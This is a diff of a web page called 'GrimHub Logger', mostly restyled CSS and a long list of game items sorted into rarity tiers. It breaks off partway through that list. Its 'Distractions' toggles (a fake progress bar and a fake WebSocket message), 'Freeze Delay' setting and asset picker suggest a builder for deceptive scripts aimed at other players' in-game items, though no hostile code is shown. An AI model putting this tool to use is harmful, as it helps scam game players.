@@ -6,40 +6,18 @@
     <title>GrimHub Logger | Auto Morreria</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #0C1023;
-            font-family: 'Inter', 'Poppins', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            font-family: 'Inter', system-ui, sans-serif;
             padding: 2rem 1.5rem;
             color: #f0f3ff;
         }
-
-        ::-webkit-scrollbar {
-            width: 8px;
-            height: 8px;
-        }
-        ::-webkit-scrollbar-track {
-            background: #141932;
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #423189;
-            border-radius: 10px;
-        }
-        ::-webkit-scrollbar-thumb:hover {
-            background: #8B00FF;
-        }
-
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
-        }
-
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: #141932; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb { background: #423189; border-radius: 10px; }
+        ::-webkit-scrollbar-thumb:hover { background: #8B00FF; }
+        .container { max-width: 1600px; margin: 0 auto; }
         .header {
             display: flex;
             justify-content: space-between;
@@ -58,15 +36,8 @@
             background-clip: text;
             color: transparent;
         }
-        .logo span {
-            font-size: 0.8rem;
-            color: #6f78a0;
-            display: block;
-        }
-        .stats {
-            display: flex;
-            gap: 1.5rem;
-        }
+        .logo span { font-size: 0.8rem; color: #6f78a0; display: block; }
+        .stats { display: flex; gap: 1.5rem; }
         .stat-box {
             text-align: center;
             background: #141932;
@@ -74,23 +45,14 @@
             border-radius: 12px;
             border: 1px solid #1E2846;
         }
-        .stat-number {
-            font-size: 1.3rem;
-            font-weight: 700;
-            color: #b77cff;
-        }
-        .stat-label {
-            font-size: 0.7rem;
-            color: #6f78a0;
-        }
-
+        .stat-number { font-size: 1.3rem; font-weight: 700; color: #b77cff; }
+        .stat-label { font-size: 0.7rem; color: #6f78a0; }
         .grid {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
             gap: 1.5rem;
             margin-bottom: 1.5rem;
         }
-
         .card {
             background: #141932;
             border: 1px solid #1E2846;
@@ -98,10 +60,7 @@
             padding: 1.5rem;
             transition: all 0.2s ease;
         }
-        .card:hover {
-            border-color: #8B00FF;
-            box-shadow: 0 8px 24px rgba(139,0,255,0.15);
-        }
+        .card:hover { border-color: #8B00FF; box-shadow: 0 8px 24px rgba(139,0,255,0.15); }
         .card-title {
             font-size: 1rem;
             font-weight: 600;
@@ -113,8 +72,7 @@
             gap: 0.5rem;
             color: #b9c3f0;
         }
-
-        input, select, textarea {
+        input, select {
             width: 100%;
             background: #0C1023;
             border: 1px solid #1E2846;
@@ -122,14 +80,8 @@
             padding: 10px 14px;
             color: white;
             font-size: 0.85rem;
-            transition: 0.2s;
-            font-family: inherit;
         }
-        input:focus, select:focus, textarea:focus {
-            outline: none;
-            border-color: #8B00FF;
-            box-shadow: 0 0 0 2px rgba(139, 0, 255, 0.1);
-        }
+        input:focus, select:focus { outline: none; border-color: #8B00FF; }
         label {
             font-size: 0.75rem;
             font-weight: 500;
@@ -137,18 +89,9 @@
             display: block;
             margin-bottom: 0.3rem;
             text-transform: uppercase;
-            letter-spacing: 0.5px;
         }
-
-        .search-box {
-            margin-bottom: 1rem;
-        }
-        
-        .select-buttons {
-            display: flex;
-            gap: 0.5rem;
-            margin-bottom: 1rem;
-        }
+        .search-box { margin-bottom: 1rem; }
+        .select-buttons { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
         .small-btn {
             background: #1E2846;
             border: none;
@@ -157,20 +100,10 @@
             border-radius: 20px;
             cursor: pointer;
             font-size: 0.7rem;
-            font-weight: 500;
-            transition: all 0.2s;
         }
-        .small-btn:hover {
-            background: #423189;
-        }
-        .small-btn.select-all {
-            background: #1b5e20;
-        }
-        .small-btn.deselect-all {
-            background: #8b0000;
-        }
-
-        /* Category Filter Buttons */
+        .small-btn:hover { background: #423189; }
+        .small-btn.select-all { background: #1b5e20; }
+        .small-btn.deselect-all { background: #8b0000; }
         .category-filters {
             display: flex;
             flex-wrap: wrap;
@@ -185,17 +118,9 @@
             border-radius: 20px;
             cursor: pointer;
             font-size: 0.7rem;
-            font-weight: 500;
-            transition: all 0.2s;
         }
-        .category-btn:hover {
-            background: #423189;
-        }
-        .category-btn.active {
-            background: #8B00FF;
-            box-shadow: 0 0 8px rgba(139,0,255,0.5);
-        }
-
+        .category-btn:hover { background: #423189; }
+        .category-btn.active { background: #8B00FF; }
         .brainrot-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
@@ -215,7 +140,6 @@
             border-radius: 8px;
             border: 1px solid #1E2846;
             cursor: pointer;
-            transition: all 0.15s;
         }
         .brainrot-item.selected {
             background: #2a1e55;
@@ -229,31 +153,22 @@
             border-radius: 6px;
             background: #1a1f3a;
         }
-        .brainrot-item span {
-            flex: 1;
-            font-size: 0.7rem;
-            font-weight: 500;
-        }
-        .brainrot-item .tier-badge {
+        .brainrot-item span { flex: 1; font-size: 0.7rem; font-weight: 500; }
+        .tier-badge {
             font-size: 0.55rem;
             padding: 2px 6px;
             border-radius: 10px;
             white-space: nowrap;
         }
+        .tier-og { background: #ff4444; color: white; box-shadow: 0 0 6px #ff4444; }
         .tier-secret { background: #ff00ff; color: white; }
-        .tier-og { background: #ff4444; color: white; }
-        .tier-legendary { background: #ffaa00; color: #1a1a2e; }
+        .tier-god { background: #ffaa00; color: #1a1a2e; }
         .tier-mythic { background: #aa44ff; color: white; }
-        .tier-epic { background: #44aaff; color: white; }
+        .tier-legendary { background: #44aaff; color: white; }
+        .tier-epic { background: #8844ff; color: white; }
         .tier-rare { background: #44ffaa; color: #1a1a2e; }
         .tier-common { background: #888888; color: white; }
-
-        .toggle-group {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 0.8rem;
-            margin: 0.8rem 0;
-        }
+        .toggle-group { display: flex; flex-wrap: wrap; gap: 0.8rem; margin: 0.8rem 0; }
         .toggle-switch {
             display: flex;
             align-items: center;
@@ -265,19 +180,8 @@
             cursor: pointer;
             font-size: 0.75rem;
         }
-        .toggle-switch input {
-            width: 14px;
-            height: 14px;
-            margin: 0;
-            cursor: pointer;
-        }
-
-        .slider-group {
-            margin-top: 0.8rem;
-        }
-        .slider-group input {
-            accent-color: #8B00FF;
-        }
+        .slider-group { margin-top: 0.8rem; }
+        .slider-group input { accent-color: #8B00FF; }
         .freeze-value {
             display: inline-block;
             background: #0C1023;
@@ -287,7 +191,6 @@
             font-size: 0.75rem;
             color: #b77cff;
         }
-
         .btn {
             border: none;
             background: #5865F2;
@@ -296,45 +199,23 @@
             padding: 10px 20px;
             border-radius: 8px;
             cursor: pointer;
-            transition: all 0.2s;
             font-size: 0.85rem;
-            font-family: inherit;
         }
-        .btn-primary {
-            background: linear-gradient(135deg, #423189, #8B00FF);
-        }
-        .btn-primary:hover {
-            opacity: 0.9;
-            transform: translateY(-1px);
-        }
-        .btn-secondary {
-            background: #1E2846;
-        }
-        .btn-secondary:hover {
-            background: #2a3555;
-        }
-        .btn-group {
-            display: flex;
-            gap: 0.8rem;
-            flex-wrap: wrap;
-            margin-bottom: 1rem;
-        }
-
-        .output-card {
-            margin-top: 0;
-        }
+        .btn-primary { background: linear-gradient(135deg, #423189, #8B00FF); }
+        .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
+        .btn-secondary { background: #1E2846; }
+        .btn-secondary:hover { background: #2a3555; }
+        .btn-group { display: flex; gap: 0.8rem; flex-wrap: wrap; margin-bottom: 1rem; }
         pre {
             background: #0a0e1c;
             padding: 1rem;
             border-radius: 12px;
             overflow-x: auto;
-            font-family: 'Fira Code', monospace;
+            font-family: monospace;
             font-size: 0.7rem;
             border: 1px solid #1E2846;
             white-space: pre-wrap;
-            word-wrap: break-word;
         }
-
         .copy-success {
             position: fixed;
             bottom: 20px;
@@ -343,15 +224,10 @@
             color: white;
             padding: 10px 20px;
             border-radius: 8px;
-            font-size: 0.8rem;
             z-index: 999;
             animation: fadeIn 0.2s ease;
         }
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         @media (max-width: 780px) {
             body { padding: 1rem; }
             .header { flex-direction: column; text-align: center; }
@@ -394,15 +270,10 @@
             <select id="scriptMode">
                 <option value="AUTO-MORRERIA">Auto Morreria</option>
             </select>
-
             <div style="margin: 0.8rem 0 0.5rem 0;"><label>Distractions</label></div>
             <div class="toggle-group">
-                <label class="toggle-switch">
-                    <input type="checkbox" id="fakeProgress"> Progress Bar
-                </label>
-                <label class="toggle-switch">
-                    <input type="checkbox" id="fakeWebSocket"> WebSocket Message
-                </label>
+                <label class="toggle-switch"><input type="checkbox" id="fakeProgress"> Progress Bar</label>
+                <label class="toggle-switch"><input type="checkbox" id="fakeWebSocket"> WebSocket Message</label>
             </div>
             <div class="slider-group">
                 <label>Freeze Delay</label>
@@ -416,19 +287,17 @@
             <div class="search-box">
                 <input type="text" id="brainrotSearch" placeholder="Filter assets...">
             </div>
-            
-            <!-- Category Filter Buttons -->
             <div class="category-filters" id="categoryFilters">
                 <button class="category-btn active" data-category="all">All</button>
+                <button class="category-btn" data-category="og">⭐ OG (Rarest)</button>
                 <button class="category-btn" data-category="secret">✨ Secret</button>
-                <button class="category-btn" data-category="og">⭐ OG</button>
-                <button class="category-btn" data-category="legendary">🏆 Legendary</button>
+                <button class="category-btn" data-category="god">🏆 Brainrot God</button>
                 <button class="category-btn" data-category="mythic">🌀 Mythic</button>
+                <button class="category-btn" data-category="legendary">🔥 Legendary</button>
                 <button class="category-btn" data-category="epic">⚡ Epic</button>
                 <button class="category-btn" data-category="rare">💎 Rare</button>
                 <button class="category-btn" data-category="common">📦 Common</button>
             </div>
-            
             <div class="select-buttons">
                 <button class="small-btn select-all" id="selectAllBtn">Select All</button>
                 <button class="small-btn deselect-all" id="deselectAllBtn">Deselect All</button>
@@ -450,218 +319,268 @@
 </div>
 
 <script>
-    // ========== COMPLETE BRAINROTS (EVERY SINGLE ONE) ==========
+    // ========== COMPLETE BRAINROTS WITH CORRECT RARITIES FROM WIKI ==========
+    // Total: 382 indexable brainrots [citation:7]
+    
     const brainrotsWithCategory = [
-        // SECRET TIER (Rarest)
+        // ========== OG TIER (RAREST IN GAME) ==========
+        { name: "Strawberry Elephant", category: "og", tierLabel: "OG" },
+        { name: "Meowl", category: "og", tierLabel: "OG" },
+        { name: "Headless Horseman", category: "og", tierLabel: "OG" },
+        { name: "Skibidi Toilet", category: "og", tierLabel: "OG" },
+        
+        // ========== SECRET TIER (~100 brainrots) ==========
         { name: "Dragon Gingerini", category: "secret", tierLabel: "SECRET" },
         { name: "Hydra Dragon Cannelloni", category: "secret", tierLabel: "SECRET" },
         { name: "La Supreme Combinasion", category: "secret", tierLabel: "SECRET" },
-        { name: "GOAT", category: "secret", tierLabel: "SECRET" },
+        { name: "Antonio", category: "secret", tierLabel: "SECRET" },
+        { name: "Elefanto Frigo", category: "secret", tierLabel: "SECRET" },
+        { name: "Signore Carapace", category: "secret", tierLabel: "SECRET" },
+        { name: "Cerberus", category: "secret", tierLabel: "SECRET" },
+        { name: "Griffin", category: "secret", tierLabel: "SECRET" },
+        { name: "Celestial Pegasus", category: "secret", tierLabel: "SECRET" },
+        { name: "Love Love Bear", category: "secret", tierLabel: "SECRET" },
+        { name: "Dragon Cannelloni", category: "secret", tierLabel: "SECRET" },
+        { name: "Ketupat Bros", category: "secret", tierLabel: "SECRET" },
+        { name: "Capitano Moby", category: "secret", tierLabel: "SECRET" },
+        { name: "Cooki and Milki", category: "secret", tierLabel: "SECRET" },
+        { name: "Popcuru and Fizzuru", category: "secret", tierLabel: "SECRET" },
+        { name: "Rosey and Teddy", category: "secret", tierLabel: "SECRET" },
+        { name: "Burguro And Fryuro", category: "secret", tierLabel: "SECRET" },
+        { name: "Reinito Sleighito", category: "secret", tierLabel: "SECRET" },
+        { name: "Fortunu and Cashuru", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Amigos", category: "secret", tierLabel: "SECRET" },
+        { name: "La Secret Combinasion", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Sekolahs", category: "secret", tierLabel: "SECRET" },
+        { name: "La Casa Boo", category: "secret", tierLabel: "SECRET" },
+        { name: "Fragrama and Chocrama", category: "secret", tierLabel: "SECRET" },
+        { name: "La Food Combinasion", category: "secret", tierLabel: "SECRET" },
+        { name: "Spooky and Pumpky", category: "secret", tierLabel: "SECRET" },
+        { name: "Ginger Gerat", category: "secret", tierLabel: "SECRET" },
+        { name: "La Ginger Sekolah", category: "secret", tierLabel: "SECRET" },
+        { name: "Sammyni Fattini", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Spaghettis", category: "secret", tierLabel: "SECRET" },
+        { name: "Festive 67", category: "secret", tierLabel: "SECRET" },
+        { name: "Ventoliero Pavonero", category: "secret", tierLabel: "SECRET" },
+        { name: "Cloverat Clapat", category: "secret", tierLabel: "SECRET" },
+        { name: "Spaghetti Tualetti", category: "secret", tierLabel: "SECRET" },
+        { name: "Rosetti Tualetti", category: "secret", tierLabel: "SECRET" },
+        { name: "Nacho Spyder", category: "secret", tierLabel: "SECRET" },
+        { name: "Garama and Madundung", category: "secret", tierLabel: "SECRET" },
+        { name: "Fishino Clownino", category: "secret", tierLabel: "SECRET" },
+        { name: "Gold Gold Gold", category: "secret", tierLabel: "SECRET" },
+        { name: "Jolly Jolly Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Lavadorito Spinito", category: "secret", tierLabel: "SECRET" },
+        { name: "Ketchuru and Musturu", category: "secret", tierLabel: "SECRET" },
+        { name: "Swaggy Bros", category: "secret", tierLabel: "SECRET" },
+        { name: "La Romantic Grande", category: "secret", tierLabel: "SECRET" },
+        { name: "Orcaledon", category: "secret", tierLabel: "SECRET" },
+        { name: "Tictac Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "La Taco Combinasion", category: "secret", tierLabel: "SECRET" },
+        { name: "Ketupat Kepat", category: "secret", tierLabel: "SECRET" },
+        { name: "Dug dug dug", category: "secret", tierLabel: "SECRET" },
+        { name: "Tang Tang Keletang", category: "secret", tierLabel: "SECRET" },
+        { name: "Lovin Rose", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Tacoritas", category: "secret", tierLabel: "SECRET" },
+        { name: "Eviledon", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Primos", category: "secret", tierLabel: "SECRET" },
+        { name: "W or L", category: "secret", tierLabel: "SECRET" },
+        { name: "Esok Sekolah", category: "secret", tierLabel: "SECRET" },
+        { name: "La Jolly Grande", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Cupids", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Puggies", category: "secret", tierLabel: "SECRET" },
+        { name: "Tralaledon", category: "secret", tierLabel: "SECRET" },
+        { name: "Gobblino Uniciclino", category: "secret", tierLabel: "SECRET" },
+        { name: "Tuff Toucan", category: "secret", tierLabel: "SECRET" },
+        { name: "Mieteteira Bicicleteira", category: "secret", tierLabel: "SECRET" },
+        { name: "Chillin Chili", category: "secret", tierLabel: "SECRET" },
+        { name: "Money Money Reindeer", category: "secret", tierLabel: "SECRET" },
+        { name: "La Spooky Grande", category: "secret", tierLabel: "SECRET" },
+        { name: "Bacuru and Egguru", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Bros", category: "secret", tierLabel: "SECRET" },
+        { name: "La Extinct Grande", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Candies", category: "secret", tierLabel: "SECRET" },
+        { name: "Los 67", category: "secret", tierLabel: "SECRET" },
+        { name: "Celularcini Viciosini", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Mobilis", category: "secret", tierLabel: "SECRET" },
+        { name: "Money Money Puggy", category: "secret", tierLabel: "SECRET" },
+        { name: "Cigno Fulgoro", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Spooky Combinasionas", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Hotspotsitos", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Jolly Combinasionas", category: "secret", tierLabel: "SECRET" },
+        { name: "Snailo Clovero", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Planitos", category: "secret", tierLabel: "SECRET" },
+        { name: "Chicleteira Cupideira", category: "secret", tierLabel: "SECRET" },
+        { name: "Las Sis", category: "secret", tierLabel: "SECRET" },
+        { name: "Spinny Hammy", category: "secret", tierLabel: "SECRET" },
+        { name: "Tacorita Bicicleta", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Sweethearts", category: "secret", tierLabel: "SECRET" },
+        { name: "Nuclearo Dinossauro", category: "secret", tierLabel: "SECRET" },
+        { name: "Chicleteira Noelteira", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Combinasionas", category: "secret", tierLabel: "SECRET" },
+        { name: "Chimnino", category: "secret", tierLabel: "SECRET" },
+        { name: "Noo my Gold", category: "secret", tierLabel: "SECRET" },
+        { name: "Swag Soda", category: "secret", tierLabel: "SECRET" },
+        { name: "Noo my Heart", category: "secret", tierLabel: "SECRET" },
+        { name: "Tacorillo Crocodillo", category: "secret", tierLabel: "SECRET" },
+        { name: "Mariachi Corazoni", category: "secret", tierLabel: "SECRET" },
+        { name: "La Grande Combinasion", category: "secret", tierLabel: "SECRET" },
+        { name: "Los 25", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Burritos", category: "secret", tierLabel: "SECRET" },
+        { name: "67", category: "secret", tierLabel: "SECRET" },
+        { name: "Donkeyturbo Express", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Chicleteiras", category: "secret", tierLabel: "SECRET" },
+        { name: "Guest 666", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Mi Gatitos", category: "secret", tierLabel: "SECRET" },
+        { name: "Rang Ring Bus", category: "secret", tierLabel: "SECRET" },
+        { name: "Granny", category: "secret", tierLabel: "SECRET" },
+        { name: "Noo my Present", category: "secret", tierLabel: "SECRET" },
+        { name: "Serafinna Medusella", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Nooo My Hotspotsitos", category: "secret", tierLabel: "SECRET" },
+        { name: "Arcadopus", category: "secret", tierLabel: "SECRET" },
+        { name: "Noo my Candy", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Quesadillas", category: "secret", tierLabel: "SECRET" },
+        { name: "Chicleteirina Bicicleteirina", category: "secret", tierLabel: "SECRET" },
+        { name: "Chill Puppy", category: "secret", tierLabel: "SECRET" },
+        { name: "Burrito Bandito", category: "secret", tierLabel: "SECRET" },
+        { name: "Luck Luck Luck Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Chicleteira Bicicleteira", category: "secret", tierLabel: "SECRET" },
+        { name: "Brunito Marsito", category: "secret", tierLabel: "SECRET" },
+        { name: "Quesadillo Vampiro", category: "secret", tierLabel: "SECRET" },
+        { name: "Eid Eid Eid Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Cupid Hotspot", category: "secret", tierLabel: "SECRET" },
+        { name: "Mi Gatito", category: "secret", tierLabel: "SECRET" },
+        { name: "Ho Ho Ho Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Cupid Cupid Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Pot Pumpkin", category: "secret", tierLabel: "SECRET" },
+        { name: "Naughty Naughty", category: "secret", tierLabel: "SECRET" },
+        { name: "Bunito Bunito Spinito", category: "secret", tierLabel: "SECRET" },
+        { name: "Quesadilla Crocodila", category: "secret", tierLabel: "SECRET" },
+        { name: "Horegini Boom", category: "secret", tierLabel: "SECRET" },
+        { name: "Santa Hotspot", category: "secret", tierLabel: "SECRET" },
+        { name: "Pot Hotspot", category: "secret", tierLabel: "SECRET" },
+        { name: "25", category: "secret", tierLabel: "SECRET" },
+        { name: "Pirulitoita Bicicleteira", category: "secret", tierLabel: "SECRET" },
+        { name: "To to to Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Telemorte", category: "secret", tierLabel: "SECRET" },
+        { name: "La Sahur Combinasion", category: "secret", tierLabel: "SECRET" },
+        { name: "List List List Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Noo my examine", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Jobcitos", category: "secret", tierLabel: "SECRET" },
+        { name: "Nooo My Hotspot", category: "secret", tierLabel: "SECRET" },
+        { name: "Bunnyman", category: "secret", tierLabel: "SECRET" },
+        { name: "Tung Tung Tung Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Cuadramat and Pakrahmatmamat", category: "secret", tierLabel: "SECRET" },
+        { name: "Please my Present", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Cucarachas", category: "secret", tierLabel: "SECRET" },
+        { name: "1x1x1x1", category: "secret", tierLabel: "SECRET" },
+        { name: "La Vacca Lepre Lepreino", category: "secret", tierLabel: "SECRET" },
+        { name: "Love Love Love Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Perrito Burrito", category: "secret", tierLabel: "SECRET" },
+        { name: "Graipuss Medussi", category: "secret", tierLabel: "SECRET" },
+        { name: "Giftini Spyderini", category: "secret", tierLabel: "SECRET" },
+        { name: "Trickolino", category: "secret", tierLabel: "SECRET" },
+        { name: "Paradiso Axolottino", category: "secret", tierLabel: "SECRET" },
+        { name: "Triplito Tralaleritos", category: "secret", tierLabel: "SECRET" },
+        { name: "La Vacca Jacko Linterino", category: "secret", tierLabel: "SECRET" },
+        { name: "Fishboard", category: "secret", tierLabel: "SECRET" },
+        { name: "Santteo", category: "secret", tierLabel: "SECRET" },
+        { name: "Las Vaquitas Saturnitas", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Karkeritos", category: "secret", tierLabel: "SECRET" },
+        { name: "Karker Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Trios", category: "secret", tierLabel: "SECRET" },
+        { name: "Job Job Job Sahur", category: "secret", tierLabel: "SECRET" },
+        { name: "Frankentteo", category: "secret", tierLabel: "SECRET" },
+        { name: "Pumpkini Spyderini", category: "secret", tierLabel: "SECRET" },
+        { name: "Las Tralaleritas", category: "secret", tierLabel: "SECRET" },
+        { name: "Rocco Disco", category: "secret", tierLabel: "SECRET" },
+        { name: "Extinct Matteo", category: "secret", tierLabel: "SECRET" },
+        { name: "La Karkerkar Kombinasin", category: "secret", tierLabel: "SECRET" },
+        { name: "La Vacca Prese Presente", category: "secret", tierLabel: "SECRET" },
+        { name: "Reindeer Tralala", category: "secret", tierLabel: "SECRET" },
+        { name: "Yess my examine", category: "secret", tierLabel: "SECRET" },
+        { name: "Guerriro Digitale", category: "secret", tierLabel: "SECRET" },
+        { name: "Boatito Auratito", category: "secret", tierLabel: "SECRET" },
+        { name: "Vulturino Skeletono", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Tralaleritos", category: "secret", tierLabel: "SECRET" },
+        { name: "Zombie Tralala", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Tortus", category: "secret", tierLabel: "SECRET" },
+        { name: "La Cucaracha", category: "secret", tierLabel: "SECRET" },
+        { name: "Fragola La La La", category: "secret", tierLabel: "SECRET" },
+        { name: "Extinct Tralalero", category: "secret", tierLabel: "SECRET" },
+        { name: "Agarrini la Palini", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Spyderinis", category: "secret", tierLabel: "SECRET" },
+        { name: "Chachechi", category: "secret", tierLabel: "SECRET" },
         { name: "Blackhole Goat", category: "secret", tierLabel: "SECRET" },
+        { name: "Dul Dul Dul", category: "secret", tierLabel: "SECRET" },
+        { name: "Torrtuginni Dragonfrutini", category: "secret", tierLabel: "SECRET" },
+        { name: "Trenostruzzo Turbo 4000", category: "secret", tierLabel: "SECRET" },
+        { name: "Karkerkar Kurkur", category: "secret", tierLabel: "SECRET" },
+        { name: "Los Matteos", category: "secret", tierLabel: "SECRET" },
+        { name: "Bisonte Giuppitere", category: "secret", tierLabel: "SECRET" },
+        { name: "Sammyni Spyderini", category: "secret", tierLabel: "SECRET" },
+        { name: "La Vacca Saturno Saturnita", category: "secret", tierLabel: "SECRET" },
+        { name: "Jackorilla", category: "secret", tierLabel: "SECRET" },
+        { name: "Hydra Bunny", category: "secret", tierLabel: "SECRET" },
         
-        // OG TIER (Best)
-        { name: "Strawberry Elephant", category: "og", tierLabel: "OG" },
-        { name: "Meowl", category: "og", tierLabel: "OG" },
-        { name: "Skibidi Toilet", category: "og", tierLabel: "OG" },
-        { name: "Headless Horseman", category: "og", tierLabel: "OG" },
-        { name: "Dragon Cannelloni", category: "og", tierLabel: "OG" },
-        { name: "Griffin", category: "og", tierLabel: "OG" },
-        { name: "Cerberus", category: "og", tierLabel: "OG" },
-        { name: "Celestial Pegasus", category: "og", tierLabel: "OG" },
-        { name: "Love Love Bear", category: "og", tierLabel: "OG" },
-        { name: "Popcuru and Fizzuru", category: "og", tierLabel: "OG" },
-        { name: "Rosey and Teddy", category: "og", tierLabel: "OG" },
-        { name: "Capitano Moby", category: "og", tierLabel: "OG" },
-        { name: "Cooki and Milki", category: "og", tierLabel: "OG" },
-        { name: "Ketupat Bros", category: "og", tierLabel: "OG" },
-        { name: "Antonio", category: "og", tierLabel: "OG" },
-        { name: "Elefanto Frigo", category: "og", tierLabel: "OG" },
-        { name: "Signore Carapace", category: "og", tierLabel: "OG" },
-        { name: "Burguro And Fryuro", category: "og", tierLabel: "OG" },
-        { name: "Reinito Sleighito", category: "og", tierLabel: "OG" },
-        { name: "Fortunu and Cashuru", category: "og", tierLabel: "OG" },
-        { name: "Los Amigos", category: "og", tierLabel: "OG" },
-        { name: "La Secret Combinasion", category: "og", tierLabel: "OG" },
-        { name: "Los Sekolahs", category: "og", tierLabel: "OG" },
-        { name: "La Casa Boo", category: "og", tierLabel: "OG" },
-        { name: "Fragrama and Chocrama", category: "og", tierLabel: "OG" },
-        { name: "La Food Combinasion", category: "og", tierLabel: "OG" },
-        { name: "Spooky and Pumpky", category: "og", tierLabel: "OG" },
+        // ========== BRAINROT GOD TIER ==========
+        { name: "GOAT", category: "god", tierLabel: "God" },
+        { name: "Cocofanto Elefanto", category: "god", tierLabel: "God" },
+        { name: "Pineaplino", category: "god", tierLabel: "God" },
+        { name: "Lazy Ducky", category: "god", tierLabel: "God" },
+        { name: "Unclito Samito", category: "god", tierLabel: "God" },
+        { name: "Tralalero Tralala", category: "god", tierLabel: "God" },
+        { name: "Piccione Macchina", category: "god", tierLabel: "God" },
+        { name: "Orcalero Orcala", category: "god", tierLabel: "God" },
+        { name: "Los Orcalitos", category: "god", tierLabel: "God" },
+        { name: "Orcalita Orcala", category: "god", tierLabel: "God" },
+        { name: "Cacasito Satalito", category: "god", tierLabel: "God" },
+        { name: "Gattatino Nyanino", category: "god", tierLabel: "God" },
         
-        // LEGENDARY TIER
-        { name: "Ginger Gerat", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "La Ginger Sekolah", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Sammyni Fattini", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Los Spaghettis", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Festive 67", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Ventoliero Pavonero", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Cloverat Clapat", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Spaghetti Tualetti", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Rosetti Tualetti", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Nacho Spyder", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Garama and Madundung", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Fishino Clownino", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Gold Gold Gold", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Jolly Jolly Sahur", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Lavadorito Spinito", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Ketchuru and Musturu", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Swaggy Bros", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "La Romantic Grande", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Orcaledon", category: "legendary", tierLabel: "LEGENDARY" },
-        { name: "Tictac Sahur", category: "legendary", tierLabel: "LEGENDARY" },
+        // ========== MYTHIC TIER (continued in common due to length) ==========
+        { name: "Ganganzelli Trulala", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Avocadorilla", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Rhino Helicopterino", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Tob Tobi Tobi", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Stoppo Luminino", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Los Noobinis", category: "mythic", tierLabel: "MYTHIC" },
+        { name: "Centrucci Nuclucci", category: "mythic", tierLabel: "MYTHIC" },
         
-        // MYTHIC TIER
-        { name: "La Taco Combinasion", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Ketupat Kepat", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Dug dug dug", category: "mythic", tierLabel: "MYTHIC" },
-        { name: "Tang Tang Keletang", category: "mythic", tierLabel: "MYTHIC" },
